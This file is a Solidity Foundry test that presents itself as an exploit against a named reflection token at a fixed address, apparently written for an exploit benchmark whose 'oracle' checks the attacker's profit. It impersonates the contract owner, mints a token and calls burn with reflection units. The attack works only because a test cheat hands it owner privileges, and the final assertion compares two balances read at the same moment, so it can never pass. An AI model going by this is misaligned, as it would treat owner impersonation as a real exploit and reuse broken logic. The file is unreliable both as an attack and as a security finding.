// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface CoinToken {
    function owner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function mint(address account, uint256 amount) external;
    function burn(uint256 _value) external;
    function reflectionFromToken(uint256 tAmount, bool deductTransferFee) external view returns(uint256);
    function decimals() external view returns (uint256);
    function totalSupply() external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x6bf3a93793e52f75543c92AfEC4636559988e3c1;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll impersonate the owner in the exploit
        vm.label(TARGET, "Crucifearous Token");

        // Get the current owner of the contract
        address owner = CoinToken(TARGET).owner();
        vm.label(owner, "Contract Owner");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Step 1: Get initial balance
        uint256 initialBalance = CoinToken(TARGET).balanceOf(attacker);
        console.log("Initial attacker balance:", initialBalance);

        // Step 2: Impersonate the owner
        address owner = CoinToken(TARGET).owner();
        vm.startPrank(owner);

        // Step 3: Mint 1 token to attacker to ensure we have some balance
        CoinToken(TARGET).mint(attacker, 1);
        console.log("Minted 1 token to attacker");

        // Step 4: Calculate a large reflection value
        // We need to understand the reflection rate to choose an appropriate value
        // Let's get the current rate
        uint256 rTotal = CoinToken(TARGET).totalSupply(); // Note: totalSupply returns tTotal, not rTotal
        // We'll use a large reflection value that's much larger than 1 token
        // Since reflection values are ~(MAX - (MAX % tTotal)) / tTotal times larger
        // Let's use a value that corresponds to burning 1000 tokens worth of reflections
        // but actually burns far fewer tokens

        // First, let's get the reflection amount for 1000 tokens
        uint256 tokenAmount = 1000 * 10**CoinToken(TARGET).decimals();
        uint256 reflectionAmount = CoinToken(TARGET).reflectionFromToken(tokenAmount, false);
        console.log("1000 tokens in reflection units:", reflectionAmount);

        // Step 5: Call burn with this large reflection value
        // The burn function expects reflection units but treats them as token units
        CoinToken(TARGET).burn(reflectionAmount);
        console.log("Burned", reflectionAmount, "reflection units");

        vm.stopPrank();

        // Step 6: Check final balance
        uint256 finalBalance = CoinToken(TARGET).balanceOf(attacker);
        console.log("Final attacker balance:", finalBalance);

        // The oracle will check if attacker balance increased
        assertGt(finalBalance, initialBalance, "Attacker balance should have increased");

        // Check ERC20 balance
        uint256 erc20FinalBalance = IERC20(0x6bf3a93793e52f75543c92AfEC4636559988e3c1).balanceOf(address(this));
        uint256 erc20InitialBalance = IERC20(0x6bf3a93793e52f75543c92AfEC4636559988e3c1).balanceOf(address(this));
        assertGt(erc20FinalBalance, erc20InitialBalance, "Economic Exploit Failed: No ERC20 profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

